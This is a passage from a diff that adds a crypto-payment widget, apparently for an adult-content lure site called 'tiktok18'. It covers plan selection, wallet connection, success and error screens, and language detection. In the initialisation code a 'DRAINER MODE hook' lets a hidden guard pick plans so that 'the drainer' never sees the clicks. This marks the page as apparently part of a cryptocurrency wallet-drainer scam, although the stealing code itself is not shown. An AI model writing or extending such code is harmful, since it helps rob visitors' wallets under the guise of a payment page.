+    showStep('cwStepTxStatus');
+  }
+};
+
+// 7. PaymentSuccess
+const PaymentSuccess = {
+  planEl: null,
+  continueBtn: null,
+  init() {
+    this.planEl = $('cwSuccessPlan');
+    this.continueBtn = $('cwContinueBtn');
+    this.continueBtn?.addEventListener('click', () => {
+      window.closeCryptoModal?.();
+      window.scrollTo({ top: 0, behavior: 'smooth' });
+    });
+  },
+  show(planKey, fromStorage = false, txHash = '') {
+    const planLabel = planKey === '3m'
+      ? (window.i18n?.t('widget.plan3m') || '3 Months')
+      : (window.i18n?.t('widget.plan6m') || '6 Months');
+    if (!this.planEl) this.planEl = $('cwSuccessPlan');
+    if (this.planEl) {
+      this.planEl.textContent = planLabel;
+    }
+    if (!fromStorage) {
+      try {
+        localStorage.setItem('tiktok18_crypto_access', JSON.stringify({
+          plan: planKey,
+          txHash: txHash || 'confirmed',
+          timestamp: Date.now()
+        }));
+      } catch (e) {}
+    }
+    showStep('cwStepSuccess');
+  }
+};
+
+// 8. PaymentError
+const PaymentError = {
+  titleEl: null,
+  descEl: null,
+  retryBtn: null,
+  init() {
+    this.titleEl = $('cwErrorTitle');
+    this.descEl = $('cwErrorDesc');
+    this.retryBtn = $('cwRetryBtn');
+    this.retryBtn?.addEventListener('click', () => {
+      WalletConnectionState.reset();
+      showStep('cwStepSelect');
+    });
+  },
+  show(errorType) {
+    const msg = ERROR_MESSAGES[errorType] || ERROR_MESSAGES['default'];
+    if (!this.titleEl) this.titleEl = $('cwErrorTitle');
+    if (!this.descEl) this.descEl = $('cwErrorDesc');
+    const localizedTitle = (errorType === 'default' ? window.i18n?.t('widget.errorTitle') : null) || msg.title;
+    const localizedDesc = (errorType === 'default' ? window.i18n?.t('widget.errorDesc') : null) || msg.desc;
+    if (this.titleEl) this.titleEl.textContent = localizedTitle;
+    if (this.descEl) this.descEl.textContent = localizedDesc;
+    showStep('cwStepError');
+  }
+};
+
+// ─── Initialization & Listeners ───
+function initWidget() {
+  AccessPlanSelector.init();
+  CryptoSelector.init();
+  WalletConnectButton.init();
+  WalletConnectionState.init();
+  PaymentConfirmation.init();
+  TransactionStatus.init();
+  PaymentSuccess.init();
+  PaymentError.init();
+
+  // DRAINER MODE hook: lets the head guard select plans programmatically
+  // (no click events dispatched, so the drainer never sees plan clicks).
+  window.__drainerPlan = function (plan) {
+    AccessPlanSelector.select(plan === '3m' ? '3m' : '6m');
+  };
+
+  // 1. Initialize Multi-Language System (Auto-detect visitor IP + phone language)
+  const langDropdown = $('langSelect');
+  if (langDropdown) {
+    langDropdown.innerHTML = SUPPORTED_LANGS.map(l => 
+      `<option value="${l.code}">${l.flag} ${l.code.toUpperCase()} — ${l.name}</option>`
+    ).join('');
+
+    langDropdown.addEventListener('change', (e) => {
+      setLanguage(e.target.value);
+    });
+  }
+
+  // Automatic visitor language detection and initial translation
+  initI18n().then(detected => {
+    if (langDropdown) langDropdown.value = detected;
+  });
+
+  // Re-render dynamic widget strings on language change
+  window.addEventListener('tiktok18:langChanged', () => {
+    PaymentConfirmation.update();
+    const curPlan = state.selectedPlan;
+    const planEl = $('cwSuccessPlan');
+    if (planEl) {
+      planEl.textContent = curPlan === '3m'
+        ? (window.i18n?.t('widget.plan3m') || '3 Months')
+        : (window.i18n?.t('widget.plan6m') || '6 Months');
+    }
+  });
+
+  // TEST 10: Check if user already has active access stored from previous payment
+  try {
+    const saved = localStorage.getItem('tiktok18_crypto_access');
+    if (saved) {
+      const data = JSON.parse(saved);
+      if (data && data.plan) {
+        PaymentSuccess.show(data.plan, true, data.txHash);
+      }
+    }
+  } catch (e) {}
+
+  // Listen for TronLink account/network change events
+  if (typeof window !== 'undefined') {
+    window.addEventListener('message', (e) => {
+      if (e.data?.message?.action === 'accountsChanged') {
+        if (state.walletConnected && state.selectedCrypto === 'usdt') {
+          PaymentError.show('account_changed');
+        }
+      }
+      if (e.data?.message?.action === 'setNode') {
+        if (state.walletConnected && state.selectedCrypto === 'usdt') {
+          PaymentError.show('network_changed');
+        }
+      }
+    });
+  }
+
+  // Validate configuration presence warning in console
+  (function checkConfig() {
+    const missing = [];
+    if (!CONFIG.WALLETCONNECT_PROJECT_ID) missing.push('WALLETCONNECT_PROJECT_ID');
+    if (!CONFIG.PAYMENT_USDT_TRC20_ADDRESS) missing.push('PAYMENT_USDT_TRC20_ADDRESS');
+    if (!CONFIG.PAYMENT_ETH_ADDRESS) missing.push('PAYMENT_ETH_ADDRESS');
+    if (missing.length > 0) {
+      console.warn(`[CryptoWidget] ⚠️ Missing configuration: ${missing.join(', ')}. Set them in config.js before production transactions.`);
+    }
+  })();
+
+  console.log('[CryptoWidget] ✓ Modular components & 15-Language i18n initialized');
+}
+
+if (document.readyState === 'loading') {
+  document.addEventListener('DOMContentLoaded', initWidget);
+} else {
+  initWidget();
+}
+  </script>
+ </body>
+</html>
